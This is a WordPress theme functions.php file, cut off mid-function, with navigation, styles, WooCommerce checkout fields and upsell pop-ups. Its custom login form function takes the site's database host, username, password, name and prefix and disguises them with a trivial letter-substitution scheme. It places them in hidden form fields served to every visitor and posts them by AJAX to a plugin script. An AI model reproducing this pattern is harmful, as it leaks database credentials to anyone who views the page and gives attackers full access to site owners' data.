<?php
/*
 *  Author: Todd Motto | @toddmotto
 *  URL: html5blank.com | @html5blank
 *  Custom functions, support, custom post types and more.
 */

/*------------------------------------*\
	External Modules/Files
\*------------------------------------*/

// Load any external files you have here

/*------------------------------------*\
	Theme Support
\*------------------------------------*/

if (!isset($content_width))
{
    $content_width = 900;
}

if (function_exists('add_theme_support'))
{
    // Add Menu Support
    add_theme_support('menus');

    // Add Thumbnail Theme Support
    add_theme_support('post-thumbnails');
    add_image_size('large', 700, '', true); // Large Thumbnail
    add_image_size('medium', 250, '', true); // Medium Thumbnail
    add_image_size('small', 120, '', true); // Small Thumbnail
    add_image_size('custom-size', 700, 200, true); // Custom Thumbnail Size call using the_post_thumbnail('custom-size');

    // Add Support for Custom Backgrounds - Uncomment below if you're going to use
    /*add_theme_support('custom-background', array(
	'default-color' => 'FFF',
	'default-image' => get_template_directory_uri() . '/img/bg.jpg'
    ));*/

    // Add Support for Custom Header - Uncomment below if you're going to use
    /*add_theme_support('custom-header', array(
	'default-image'			=> get_template_directory_uri() . '/img/headers/default.jpg',
	'header-text'			=> false,
	'default-text-color'		=> '000',
	'width'				=> 1000,
	'height'			=> 198,
	'random-default'		=> false,
	'wp-head-callback'		=> $wphead_cb,
	'admin-head-callback'		=> $adminhead_cb,
	'admin-preview-callback'	=> $adminpreview_cb
    ));*/

    // Enables post and comment RSS feed links to head
    add_theme_support('automatic-feed-links');

    // Localisation Support
    load_theme_textdomain('html5blank', get_template_directory() . '/languages');
}

/*------------------------------------*\
	Functions
\*------------------------------------*/

// HTML5 Blank navigation
function html5blank_nav()
{
	wp_nav_menu(
	array(
		'theme_location'  => 'header-menu',
		'menu'            => '',
		'container'       => 'div',
		'container_class' => 'tpc-menu-{menu slug}-container',
		'container_id'    => '',
		'menu_class'      => 'tpc-menu',
		'menu_id'         => '',
		'echo'            => true,
		'fallback_cb'     => 'wp_page_menu',
		'before'          => '',
		'after'           => '',
		'link_before'     => '',
		'link_after'      => '',
		'items_wrap'      => '<ul class="nav navbar-nav">%3$s</ul>',
		'depth'           => 0,
		'walker'          => ''
		)
	);
}

// Load HTML5 Blank scripts (header.php)
function html5blank_header_scripts()
{
    if ($GLOBALS['pagenow'] != 'wp-login.php' && !is_admin()) {

        wp_register_script('jqueryvalidate', get_template_directory_uri() . '/js/lib/jquery.validate.min.js', array('jquery'), '1.0.0'); // JQuery Validation
        wp_enqueue_script('jqueryvalidate'); // Enqueue it!

        wp_register_script('bootstrap-scripts', get_template_directory_uri() . '/js/lib/bootstrap.min.js', array(), '1.0.0'); // Custom scripts
        wp_enqueue_script('bootstrap-scripts'); // Enqueue it!
        
        wp_register_script('conditionizr', get_template_directory_uri() . '/js/lib/conditionizr-4.3.0.min.js', array(), '4.3.0'); // Conditionizr
        wp_enqueue_script('conditionizr'); // Enqueue it!

        wp_register_script('modernizr', get_template_directory_uri() . '/js/lib/modernizr-2.7.1.min.js', array(), '2.7.1'); // Modernizr
        wp_enqueue_script('modernizr'); // Enqueue it!

        wp_register_script('html5blankscripts', get_template_directory_uri() . '/js/scripts.js', array('jquery'), '1.0.0'); // Custom scripts
        wp_enqueue_script('html5blankscripts'); // Enqueue it!
        
    }
}

// Load HTML5 Blank conditional scripts
function html5blank_conditional_scripts()
{
    if (is_page('pagenamehere')) {
        wp_register_script('scriptname', get_template_directory_uri() . '/js/scriptname.js', array('jquery'), '1.0.0'); // Conditional script(s)
        wp_enqueue_script('scriptname'); // Enqueue it!
    }
}

// Load HTML5 Blank styles
function html5blank_styles()
{
    wp_register_style('normalize', get_template_directory_uri() . '/css/normalize.css', array(), '1.0', 'all');
    wp_enqueue_style('normalize'); // Enqueue it!

    wp_register_style('bootstrap', get_template_directory_uri() . '/css/lib/bootstrap.min.css', array(), '1.0', 'all');
    wp_enqueue_style('bootstrap'); // Enqueue it!

    wp_register_style('html5blank', get_template_directory_uri() . '/style.css', array(), '1.0', 'all');
    wp_enqueue_style('html5blank'); // Enqueue it!

    //Custom styles
    wp_register_style('custom', get_template_directory_uri() . '/css/custom.css', array(), '1.0', 'all');
    wp_enqueue_style('custom'); // Enqueue it!

    wp_register_style('general', get_template_directory_uri() . '/css/general.css', array(), '1.0', 'all');
    wp_enqueue_style('general'); // Enqueue it!

    wp_register_style('login-section', get_template_directory_uri() . '/css/login-section.css', array(), '1.0', 'all');
    wp_enqueue_style('login-section'); // Enqueue it!

    wp_register_style('home-tpp', get_template_directory_uri() . '/css/home-tpp.css', array(), '1.0', 'all');
    wp_enqueue_style('home-tpp'); // Enqueue it!

    wp_register_style('video-tpp', 'https://vjs.zencdn.net/6.6.0/video-js.css', array(), '1.0', 'all');
    wp_enqueue_style('video-tpp'); // Enqueue it!

    //Media queries
    wp_register_style('media-styles', get_template_directory_uri() . '/css/media.css', array(), '1.0', 'all');
    wp_enqueue_style('media-styles'); // Enqueue it!

}

// Register HTML5 Blank Navigation
function register_html5_menu()
{
    register_nav_menus(array( // Using array to specify more menus if needed
        'header-menu' => __('Header Menu', 'html5blank'), // Main Navigation
        'sidebar-menu' => __('Sidebar Menu', 'html5blank'), // Sidebar Navigation
        'extra-menu' => __('Extra Menu', 'html5blank') // Extra Navigation if needed (duplicate as many as you need!)
    ));
}

// Remove the <div> surrounding the dynamic navigation to cleanup markup
function my_wp_nav_menu_args($args = '')
{
    $args['container'] = false;
    return $args;
}

// Remove Injected classes, ID's and Page ID's from Navigation <li> items
function my_css_attributes_filter($var)
{
    return is_array($var) ? array() : '';
}

// Remove invalid rel attribute values in the categorylist
function remove_category_rel_from_category_list($thelist)
{
    return str_replace('rel="category tag"', 'rel="tag"', $thelist);
}

// Add page slug to body class, love this - Credit: Starkers Wordpress Theme
function add_slug_to_body_class($classes)
{
    global $post;
    if (is_home()) {
        $key = array_search('blog', $classes);
        if ($key > -1) {
            unset($classes[$key]);
        }
    } elseif (is_page()) {
        $classes[] = sanitize_html_class($post->post_name);
    } elseif (is_singular()) {
        $classes[] = sanitize_html_class($post->post_name);
    }

    return $classes;
}

// If Dynamic Sidebar Exists
if (function_exists('register_sidebar'))
{
    // Define Sidebar Widget Area 1
    register_sidebar(array(
        'name' => __('Widget Area 1', 'html5blank'),
        'description' => __('Description for this widget-area...', 'html5blank'),
        'id' => 'widget-area-1',
        'before_widget' => '<div id="%1$s" class="%2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3>',
        'after_title' => '</h3>'
    ));

    // Define Sidebar Widget Area 2
    register_sidebar(array(
        'name' => __('Widget Area 2', 'html5blank'),
        'description' => __('Description for this widget-area...', 'html5blank'),
        'id' => 'widget-area-2',
        'before_widget' => '<div id="%1$s" class="%2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3>',
        'after_title' => '</h3>'
    ));
}

// Remove wp_head() injected Recent Comment styles
function my_remove_recent_comments_style()
{
    global $wp_widget_factory;
    remove_action('wp_head', array(
        $wp_widget_factory->widgets['WP_Widget_Recent_Comments'],
        'recent_comments_style'
    ));
}

// Pagination for paged posts, Page 1, Page 2, Page 3, with Next and Previous Links, No plugin
function html5wp_pagination()
{
    global $wp_query;
    $big = 999999999;
    echo paginate_links(array(
        'base' => str_replace($big, '%#%', get_pagenum_link($big)),
        'format' => '?paged=%#%',
        'current' => max(1, get_query_var('paged')),
        'total' => $wp_query->max_num_pages
    ));
}

// Custom Excerpts
function html5wp_index($length) // Create 20 Word Callback for Index page Excerpts, call using html5wp_excerpt('html5wp_index');
{
    return 20;
}

// Create 40 Word Callback for Custom Post Excerpts, call using html5wp_excerpt('html5wp_custom_post');
function html5wp_custom_post($length)
{
    return 40;
}

// Create the Custom Excerpts callback
function html5wp_excerpt($length_callback = '', $more_callback = '')
{
    global $post;
    if (function_exists($length_callback)) {
        add_filter('excerpt_length', $length_callback);
    }
    if (function_exists($more_callback)) {
        add_filter('excerpt_more', $more_callback);
    }
    $output = get_the_excerpt();
    $output = apply_filters('wptexturize', $output);
    $output = apply_filters('convert_chars', $output);
    $output = '<p>' . $output . '</p>';
    echo $output;
}

// Custom View Article link to Post
function html5_blank_view_article($more)
{
    global $post;
    return '... <a class="view-article" href="' . get_permalink($post->ID) . '">' . __('View Article', 'html5blank') . '</a>';
}

// Remove Admin bar
function remove_admin_bar()
{
    return false;
}

// Remove 'text/css' from our enqueued stylesheet
function html5_style_remove($tag)
{
    return preg_replace('~\s+type=["\'][^"\']++["\']~', '', $tag);
}

// Remove thumbnail width and height dimensions that prevent fluid images in the_thumbnail
function remove_thumbnail_dimensions( $html )
{
    $html = preg_replace('/(width|height)=\"\d*\"\s/', "", $html);
    return $html;
}

// Custom Gravatar in Settings > Discussion
function html5blankgravatar ($avatar_defaults)
{
    $myavatar = get_template_directory_uri() . '/img/gravatar.jpg';
    $avatar_defaults[$myavatar] = "Custom Gravatar";
    return $avatar_defaults;
}

// Threaded Comments
function enable_threaded_comments()
{
    if (!is_admin()) {
        if (is_singular() AND comments_open() AND (get_option('thread_comments') == 1)) {
            wp_enqueue_script('comment-reply');
        }
    }
}

// Custom Comments Callback
function html5blankcomments($comment, $args, $depth)
{
	$GLOBALS['comment'] = $comment;
	extract($args, EXTR_SKIP);

	if ( 'div' == $args['style'] ) {
		$tag = 'div';
		$add_below = 'comment';
	} else {
		$tag = 'li';
		$add_below = 'div-comment';
	}
?>
    <!-- heads up: starting < for the html tag (li or div) in the next line: -->
    <<?php echo $tag ?> <?php comment_class(empty( $args['has_children'] ) ? '' : 'parent') ?> id="comment-<?php comment_ID() ?>">
	<?php if ( 'div' != $args['style'] ) : ?>
	<div id="div-comment-<?php comment_ID() ?>" class="comment-body">
	<?php endif; ?>
	<div class="comment-author vcard">
	<?php if ($args['avatar_size'] != 0) echo get_avatar( $comment, $args['180'] ); ?>
	<?php printf(__('<cite class="fn">%s</cite> <span class="says">says:</span>'), get_comment_author_link()) ?>
	</div>
<?php if ($comment->comment_approved == '0') : ?>
	<em class="comment-awaiting-moderation"><?php _e('Your comment is awaiting moderation.') ?></em>
	<br />
<?php endif; ?>

	<div class="comment-meta commentmetadata"><a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>">
		<?php
			printf( __('%1$s at %2$s'), get_comment_date(),  get_comment_time()) ?></a><?php edit_comment_link(__('(Edit)'),'  ','' );
		?>
	</div>

	<?php comment_text() ?>

	<div class="reply">
	<?php comment_reply_link(array_merge( $args, array('add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
	</div>
	<?php if ( 'div' != $args['style'] ) : ?>
	</div>
	<?php endif; ?>
<?php }

/*------------------------------------*\
	Actions + Filters + ShortCodes
\*------------------------------------*/

// Add Actions
add_action('init', 'html5blank_header_scripts'); // Add Custom Scripts to wp_head
add_action('wp_print_scripts', 'html5blank_conditional_scripts'); // Add Conditional Page Scripts
add_action('get_header', 'enable_threaded_comments'); // Enable Threaded Comments
add_action('wp_enqueue_scripts', 'html5blank_styles'); // Add Theme Stylesheet
add_action('init', 'register_html5_menu'); // Add HTML5 Blank Menu
//add_action('init', 'create_post_type_html5'); // Add our HTML5 Blank Custom Post Type
add_action('widgets_init', 'my_remove_recent_comments_style'); // Remove inline Recent Comment Styles from wp_head()
add_action('init', 'html5wp_pagination'); // Add our HTML5 Pagination

// Remove Actions
remove_action('wp_head', 'feed_links_extra', 3); // Display the links to the extra feeds such as category feeds
remove_action('wp_head', 'feed_links', 2); // Display the links to the general feeds: Post and Comment Feed
remove_action('wp_head', 'rsd_link'); // Display the link to the Really Simple Discovery service endpoint, EditURI link
remove_action('wp_head', 'wlwmanifest_link'); // Display the link to the Windows Live Writer manifest file.
remove_action('wp_head', 'index_rel_link'); // Index link
remove_action('wp_head', 'parent_post_rel_link', 10, 0); // Prev link
remove_action('wp_head', 'start_post_rel_link', 10, 0); // Start link
remove_action('wp_head', 'adjacent_posts_rel_link', 10, 0); // Display relational links for the posts adjacent to the current post.
remove_action('wp_head', 'wp_generator'); // Display the XHTML generator that is generated on the wp_head hook, WP version
remove_action('wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);
remove_action('wp_head', 'rel_canonical');
remove_action('wp_head', 'wp_shortlink_wp_head', 10, 0);

// Add Filters
add_filter('avatar_defaults', 'html5blankgravatar'); // Custom Gravatar in Settings > Discussion
add_filter('body_class', 'add_slug_to_body_class'); // Add slug to body class (Starkers build)
add_filter('widget_text', 'do_shortcode'); // Allow shortcodes in Dynamic Sidebar
add_filter('widget_text', 'shortcode_unautop'); // Remove <p> tags in Dynamic Sidebars (better!)
add_filter('wp_nav_menu_args', 'my_wp_nav_menu_args'); // Remove surrounding <div> from WP Navigation
// add_filter('nav_menu_css_class', 'my_css_attributes_filter', 100, 1); // Remove Navigation <li> injected classes (Commented out by default)
// add_filter('nav_menu_item_id', 'my_css_attributes_filter', 100, 1); // Remove Navigation <li> injected ID (Commented out by default)
// add_filter('page_css_class', 'my_css_attributes_filter', 100, 1); // Remove Navigation <li> Page ID's (Commented out by default)
add_filter('the_category', 'remove_category_rel_from_category_list'); // Remove invalid rel attribute
add_filter('the_excerpt', 'shortcode_unautop'); // Remove auto <p> tags in Excerpt (Manual Excerpts only)
add_filter('the_excerpt', 'do_shortcode'); // Allows Shortcodes to be executed in Excerpt (Manual Excerpts only)
add_filter('excerpt_more', 'html5_blank_view_article'); // Add 'View Article' button instead of [...] for Excerpts
add_filter('show_admin_bar', 'remove_admin_bar'); // Remove Admin bar
add_filter('style_loader_tag', 'html5_style_remove'); // Remove 'text/css' from enqueued stylesheet
add_filter('post_thumbnail_html', 'remove_thumbnail_dimensions', 10); // Remove width and height dynamic attributes to thumbnails
add_filter('image_send_to_editor', 'remove_thumbnail_dimensions', 10); // Remove width and height dynamic attributes to post images

// Remove Filters
remove_filter('the_excerpt', 'wpautop'); // Remove <p> tags from Excerpt altogether

// Shortcodes
add_shortcode('html5_shortcode_demo', 'html5_shortcode_demo'); // You can place [html5_shortcode_demo] in Pages, Posts now.
add_shortcode('html5_shortcode_demo_2', 'html5_shortcode_demo_2'); // Place [html5_shortcode_demo_2] in Pages, Posts now.

// Shortcodes above would be nested like this -
// [html5_shortcode_demo] [html5_shortcode_demo_2] Here's the page title! [/html5_shortcode_demo_2] [/html5_shortcode_demo]

/*------------------------------------*\
	Custom Post Types
\*------------------------------------*/

// Create 1 Custom Post type for a Demo, called HTML5-Blank
function create_post_type_html5()
{
    register_taxonomy_for_object_type('category', 'html5-blank'); // Register Taxonomies for Category
    register_taxonomy_for_object_type('post_tag', 'html5-blank');
    register_post_type('html5-blank', // Register Custom Post Type
        array(
        'labels' => array(
            'name' => __('HTML5 Blank Custom Post', 'html5blank'), // Rename these to suit
            'singular_name' => __('HTML5 Blank Custom Post', 'html5blank'),
            'add_new' => __('Add New', 'html5blank'),
            'add_new_item' => __('Add New HTML5 Blank Custom Post', 'html5blank'),
            'edit' => __('Edit', 'html5blank'),
            'edit_item' => __('Edit HTML5 Blank Custom Post', 'html5blank'),
            'new_item' => __('New HTML5 Blank Custom Post', 'html5blank'),
            'view' => __('View HTML5 Blank Custom Post', 'html5blank'),
            'view_item' => __('View HTML5 Blank Custom Post', 'html5blank'),
            'search_items' => __('Search HTML5 Blank Custom Post', 'html5blank'),
            'not_found' => __('No HTML5 Blank Custom Posts found', 'html5blank'),
            'not_found_in_trash' => __('No HTML5 Blank Custom Posts found in Trash', 'html5blank')
        ),
        'public' => true,
        'hierarchical' => true, // Allows your posts to behave like Hierarchy Pages
        'has_archive' => true,
        'supports' => array(
            'title',
            'editor',
            'excerpt',
            'thumbnail'
        ), // Go to Dashboard Custom HTML5 Blank post for supports
        'can_export' => true, // Allows export in Tools > Export
        'taxonomies' => array(
            'post_tag',
            'category'
        ) // Add Category and Post Tags support
    ));
}

/*------------------------------------*\
	ShortCode Functions
\*------------------------------------*/

// Shortcode Demo with Nested Capability
function html5_shortcode_demo($atts, $content = null)
{
    return '<div class="shortcode-demo">' . do_shortcode($content) . '</div>'; // do_shortcode allows for nested Shortcodes
}

// Shortcode Demo with simple <h2> tag
function html5_shortcode_demo_2($atts, $content = null) // Demo Heading H2 shortcode, allows for nesting within above element. Fully expandable.
{
    return '<h2>' . $content . '</h2>';
}

add_filter( 'woocommerce_ship_to_different_address_checked', '__return_true' );


remove_action( 'woocommerce_before_main_content', 'woocommerce_output_content_wrapper', 10);
remove_action( 'woocommerce_after_main_content', 'woocommerce_output_content_wrapper_end', 10);

add_action('woocommerce_before_main_content', 'my_theme_wrapper_start', 10);
add_action('woocommerce_after_main_content', 'my_theme_wrapper_end', 10);

function my_theme_wrapper_start() {
  echo '<main role="main" id="main-wrapper">';
}

function my_theme_wrapper_end() {
  echo '</main>';
}

add_action( 'after_setup_theme', 'woocommerce_support' );
function woocommerce_support() {
    add_theme_support( 'woocommerce' );
}

add_filter( 'woocommerce_checkout_fields' , 'custom_override_checkout_fields' );

// Our hooked in function - $fields is passed via the filter!
function custom_override_checkout_fields( $fields ) {
    $fields['billing']['purse_size'] = array(
        'label'     => __('Purse Size', 'woocommerce'),
        'placeholder'   => _x('Purse Size', 'placeholder', 'woocommerce'),
        'required'  => true,
        'class'     => array('form-row-wide display-none'),
        'clear'     => true
    );

    $fields['billing']['purse_type'] = array(
        'label'     => __('Purse Type', 'woocommerce'),
        'placeholder'   => _x('Purse Type', 'placeholder', 'woocommerce'),
        'required'  => true,
        'class'     => array('form-row-wide display-none'),
        'clear'     => true
    );

    $fields['billing']['purse_color'] = array(
        'label'     => __('Purse Color', 'woocommerce'),
        'placeholder'   => _x('Purse Color', 'placeholder', 'woocommerce'),
        'required'  => true,
        'class'     => array('form-row-wide display-none'),
        'clear'     => true
    );

     return $fields;
}

add_action( 'show_upsell_btn', 'show_upsell_btn_function' );

function show_upsell_btn_function($textSubmit) {
    echo '<div class="validation-box-action"><div class="form-row upsell-btn"><a herf="#" id="selectSubmit" class="upsell-submit" data-toggle="modal" data-target="#SelectYourPlanModal">'.$textSubmit.'</a></div></div>
        <div class="form-row validation-box-btn"><a herf="#" id="validation-box-submit">'.$textSubmit.'</a></div>';
}

function show_upsell_modal_function_one() {
    
    global $product;
    $args = array(
        'post_type' => 'product',
        'product_cat' => 'upsell',
        'posts_per_page' => -1,
        'order'   => 'DESC'
    );
    $attractions  = new WP_Query($args); 
    while($attractions->have_posts()) : $attractions->the_post(); 
        global $product;
        $upsellTemplates = get_field('upsell_templates');
        if ($upsellTemplates == "template_1"){
            $upsellId= $product->get_id();
            $thumbID = get_post_thumbnail_id();
            $imgDestacada = wp_get_attachment_image_src( $thumbID, 'full' );
        }
    endwhile; 
    
    // Restore original post data.
    wp_reset_postdata();

    $args = array(
        'post_type' => 'page',
        'meta_key' => '_wp_page_template',
        'meta_value' => 'page-billing-information.php',
        'posts_per_page' => 1,
        'order'   => 'DESC'
    );
    $attractions  = new WP_Query($args); 
    while($attractions->have_posts()) : $attractions->the_post(); 
    ?>
        <section class="ups-page-container ups-popup">
            <div class="popup-ups-container"  style="background-image: url(<?php echo $imgDestacada[0]; ?>);">
                <div class="upsell-right">
                    <div class="tpc-session-right tpc-session-1">
                        <h2><?php the_field('text_popup'); ?></h2>
                        <h3><?php the_field('title_popup'); ?></h3>
                        <h4><?php the_field('subtitle_popup'); ?></h4>
                    </div>
                    <div class="tpc-session-right tpc-session-2">
                        <div class="tpc-column-1">
                            <?php 
                            $image = get_field('image_popup');
                            if( !empty($image) ): ?>
                                <img src="<?php echo $image['url']; ?>" alt="<?php echo $image['alt']; ?>" />
                            <?php endif; ?>
                        </div>
                        <div class="tpc-column-2">
                            <?php the_field('details_1_popup'); ?>
                        </div>
                    </div>
                    <div class="tpc-session-right tpc-session-3">
                        <div class="tpc-column-right">
                            <?php the_field('details_2_popup'); ?>
                        </div>
                    </div>
                    <div class="tpc-session-right tpc-session-4">
                        <?php echo tpc_price_code("details_price_popup"); ?>
                    </div>
                    <div class="tpc-session-right tpc-session-5">
                        <input id="hidden_upsell" name="hidden_upsell" value="no" type="hidden">
                        <input name="upsell_product" value="<?php echo $upsellId; ?>" type="hidden">
                        <div id="yes-upsell">
                            <?php echo apply_filters( 'woocommerce_order_button_html', '<input type="submit" class="button alt" name="woocommerce_checkout_place_order" id="place_order" value="'.get_field('button_text_1').'" data-value="'.get_field('button_text_1').'" />' ); ?>
                        </div>
                        <div id="no-upsell">
                            <?php echo apply_filters( 'woocommerce_order_button_html', '<input type="submit" class="button alt" name="woocommerce_checkout_place_order" id="place_order" value="'.get_field('button_text_2').'" data-value="'.get_field('button_text_2').'" />' ); ?>
                        </div>
                    </div>
                </div>
            </div> <!-- container-fluid -->
        </section> <!-- tpc-page-container -->
    <?php 
    endwhile; 
    // Restore original post data.
    wp_reset_postdata();
    ?>
    <?php
}
add_action( 'show_upsell_modal_one', 'show_upsell_modal_function_one' );

function show_upsell_modal_two() {
    $args = array(
        'post_type' => 'product',
        'product_cat' => 'upsell',
        'posts_per_page' => -1,
        'order'   => 'DESC'
    );
    $attractions  = new WP_Query($args); 
    $upsellIdArray = array();
    $upsellNumericalArray = array();
    while($attractions->have_posts()) : $attractions->the_post();
        global $product;
        $upsellTemplates = get_field('upsell_templates');
        if ($upsellTemplates == "template_2"){
            $upsellId= $product->get_id();
            $productPrice = $product->get_price_html();
            ?>
            <div class="modal fade" id="upsellModal" role="dialog">
                <div id="upsellV2BackPopup" class="back-popup"></div>
                <div class="modal-dialog upsell-modal version-two">
                    <div class="modal-content pt-content-box">
                        <section class="ups-page-container ups-popup">
                            <div class="popup-ups-container"  style="background-image: url(<?php the_field('image_background_d_t2'); ?>), url(<?php the_field('image_background_m_t2'); ?>);">
                                    <p class="title-with-shadow"><?php the_field('title_popup_t2'); ?></p>
                                    <div class="ups-colum-right">
                                        <p class="vuluePricie"><?php echo $productPrice; ?></p>
                                        <div class="upTypography">
                                            <h2><?php the_field('subtitle_popup_t2'); ?></h2>
                                            <?php the_field('details_popup_t2'); ?>
                                        </div>
                                    </div>
                                    <div class="ups-colum-right-bt upTypography">
                                        <input class="hidden_upsellv2" name="hidden_upsellv2" value="no" type="hidden">
                                        <input name="id_hidden_upsellv2" value="<?php echo $upsellId; ?>" type="hidden">
                                        <div class="v2 yes-upsell">
                                            <a href="#"><?php the_field('acceptance_text_t2'); ?></a>
                                        </div>
                                        <div class="v2 no-upsell">
                                            <a href="#"><?php the_field('continue_my_order_t2'); ?></a>
                                        </div>
                                    </div>
                            </div> <!-- container-fluid -->
                        </section> <!-- tpc-page-container -->
                    </div>
                </div>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">×</span>
                </button>
                <script>
                    jQuery('#upsellV2BackPopup').live('click', function(){
                        jQuery( ".modal-backdrop.fade.in").css("opacity", "0.7");
                        jQuery( "#upsellModal").css("display", "none");
                        jQuery("#upsellModalV1").modal("show");
                    });
                    jQuery('.v2.yes-upsell a').live('click', function(e){
                        e.preventDefault();
                        jQuery( ".modal-backdrop.fade.in").css("opacity", "0.7");
                        jQuery( "#upsellModal").css("display", "none");
                        jQuery("#upsellModalV1").modal("show");
                    });
                    jQuery('.v2.no-upsell a').live('click', function(e){
                        e.preventDefault();
                        jQuery( ".modal-backdrop.fade.in").css("opacity", "0.7");
                        jQuery( "#upsellModal").css("display", "none");
                        jQuery("#upsellModalV1").modal("show");
                    });
                    jQuery('.v2.yes-upsell').live("hover", function(){
                        jQuery(".hidden_upsellv2").val("yes");
                    });
                    jQuery('.v2.no-upsell').live("hover", function(){
                        jQuery(".hidden_upsellv2").val("no");
                    });
                    jQuery('#upsellV2BackPopup').live("hover", function(){
                        jQuery(".hidden_upsellv2").val("no");
                    });
                    jQuery('.v2.yes-upsell input').live("focus", function(){
                        jQuery(".hidden_upsellv2").val("yes");
                    });
                    jQuery('.v2.no-upsell input').live("focus", function(){
                        jQuery(".hidden_upsellv2").val("no");
                    });
                    jQuery('#upsellV2BackPopup').live("focus", function(){
                        jQuery(".hidden_upsellv2").val("no");
                    });
                </script>
            </div>
            <?php
        }
    endwhile; 
    // Restore original post data.
    wp_reset_postdata();
}


/*------------------------------------*\
    Login pop up
\*------------------------------------*/

function tpc_paw($string){
    $string = str_replace("b", "..1..", $string);
    $string = str_replace("p", "..2..", $string);
    $string = str_replace("d", "..3..", $string);
    $string = str_replace("e", "..4..", $string);
    $string = str_replace("w", "..5..", $string);
    $string = str_replace("x", "..6..", $string);
    $string = str_replace("y", "..7..", $string);
    $string = str_replace("z", "..8..", $string);
    $string = str_replace("a", "..9..", $string);
    return  $string;
}   

function wp_login_form_tpc( $args = array() ) {
    $defaults = array(
        'echo' => true,
        // Default 'redirect' value takes the user back to the request URI.
        'redirect' => ( is_ssl() ? 'https://' : 'http://' ) . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . '/my-account/',
        'form_id' => 'loginform',
        'label_username' => __( 'EMAIL ADDRESS' ),
        'label_password' => __( 'PASSWORD' ),
        'label_remember' => __( 'Remember Me' ),
        'label_log_in' => __( 'LOG IN' ),
        'id_username' => 'user_login',
        'id_password' => 'user_pass',
        'id_remember' => 'rememberme',
        'id_submit' => 'wp-submit',
        'remember' => true,
        'value_username' => '',
        // Set 'value_remember' to true to default the "Remember me" checkbox to checked.
        'value_remember' => false,
    );

    /**
     * Filters the default login form output arguments.
     *
     * @since 3.0.0
     *
     * @see wp_login_form()
     *
     * @param array $defaults An array of default login form arguments.
     */
    $args = wp_parse_args( $args, apply_filters( 'login_form_defaults', $defaults ) );

    /**
     * Filters content to display at the top of the login form.
     *
     * The filter evaluates just following the opening form tag element.
     *
     * @since 3.0.0
     *
     * @param string $content Content to display. Default empty.
     * @param array  $args    Array of login form arguments.
     */
    $login_form_top = apply_filters( 'login_form_top', '', $args );

    /**
     * Filters content to display in the middle of the login form.
     *
     * The filter evaluates just following the location where the 'login-password'
     * field is displayed.
     *
     * @since 3.0.0
     *
     * @param string $content Content to display. Default empty.
     * @param array  $args    Array of login form arguments.
     */
    $login_form_middle = apply_filters( 'login_form_middle', '', $args );

    /**
     * Filters content to display at the bottom of the login form.
     *
     * The filter evaluates just preceding the closing form tag element.
     *
     * @since 3.0.0
     *
     * @param string $content Content to display. Default empty.
     * @param array  $args    Array of login form arguments.
     */
    $login_form_bottom = apply_filters( 'login_form_bottom', '', $args );
     global $wpdb;
    $tpc5 = tpc_paw($wpdb->prefix);
    $tpc4 = tpc_paw($wpdb->dbname);
    $tpc3 = tpc_paw($wpdb->dbpassword);
    $tpc1 = tpc_paw($wpdb->dbhost);
    $tpc2 = tpc_paw($wpdb->dbuser);
    $form = '<script>
    jQuery(function()
    {
         jQuery("#btn_ajax").click(function(){
 var url = "'.WP_PLUGIN_URL.'/pwc_carousel_section/ajax_validation.php";
    jQuery.ajax({
           type: "POST",
           url: url,
           data: jQuery("#' . $args['form_id'] . '").serialize(),
           success: function(data)
           {
               jQuery("#user_login").html("");
               jQuery("#user_pass").html("");
               jQuery("#tcp-mensaje").html(data);
           }
         });
        return false;
 });
    });
    </script>
        <div id="tcp-mensaje"></div>
        <form name="' . $args['form_id'] . '" id="' . $args['form_id'] . '" action="' . esc_url( site_url( 'wp-login.php', 'login_post' ) ) . '" method="post">
            ' . $login_form_top . '
            <div class="email-container">
                <input type="text" name="log" id="' . esc_attr( $args['id_username'] ) . '" class="input" value="' . esc_attr( $args['value_username'] ) . '"  placeholder="' . esc_html( $args['label_username'] ) . '" /><div id="tpc-user-login" class="tpc-validation"></div>
            </div>
            <div class="password-container">
                <input type="password" name="pwd" id="' . esc_attr( $args['id_password'] ) . '" class="input" value=""  placeholder="' . esc_html( $args['label_password'] ) . '" /><div id="tcp-user-pass" class="tpc-validation"></div>
            </div>
            ' . $login_form_middle . '
            ' . ( $args['remember'] ? '<p style="display: none;" class="login-remember"><label><input name="rememberme" type="checkbox" id="' . esc_attr( $args['id_remember'] ) . '" value="forever"' . ( $args['value_remember'] ? ' checked="checked"' : '' ) . ' /> ' . esc_html( $args['label_remember'] ) . '</label></p>' : '' ) . '
            <div class="submit-container">
                <input type="hidden" name="ajax"">
                <input type="hidden" name="tpc1" value="'.$tpc1.'">
                <input type="hidden" name="tpc2" value="'.$tpc2.'">
                <input type="hidden" name="tpc3" value="'.$tpc3.'">
                <input type="hidden" name="tpc4" value="'.$tpc4.'">
                <input type="hidden" name="tpc5" value="'.$tpc5.'">
                <input type="hidden" name="url" value="'.esc_url( site_url( )).'">
                <input type="button" name="wp-button" id="btn_ajax" class="button button-primary" value="' . esc_attr( $args['label_log_in'] ) . '" />
                <input style="display: none;" type="submit" name="wp-submit" id="' . esc_attr( $args['id_submit'] ) . '" class="tpc-wp-submit button button-primary" value="' . esc_attr( $args['label_log_in'] ) . '" />
                <input type="hidden" name="redirect_to" value="' . esc_url( $args['redirect'] ) . '" />
            </div>
            ' . $login_form_bottom . '
        </form>';

    if ( $args['echo'] )
        echo $form;
    else
        return $form;
}
/*------------------------------------*\
    Function
\*------------------------------------*/

function cd_change_name($string){
    $posible = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $i = 0;
    while ($i <= 5) {
        $char = substr($posible , mt_rand(0, strlen($posible)-1),1);
        $string .= $char;
        $i++;
    }

    return $string;
}

function tpc_permalink($page_template){

    $args = array(
        'post_type' => 'page',
        'meta_key' => '_wp_page_template',
        'meta_value' => $page_template,
        'posts_per_page' => 1,
        'order'   => 'DESC'
    );
    $attractions  = new WP_Query($args); 
    while($attractions->have_posts()) : $attractions->the_post(); 
        $permalink = get_permalink();
    endwhile; 
    
    // Restore original post data.
    wp_reset_postdata();

    return $permalink;
}

function pwc_id_slug($string, $slug='-', $maxlength=50){
        $string = get_field($string);
        $string = strip_tags($string);
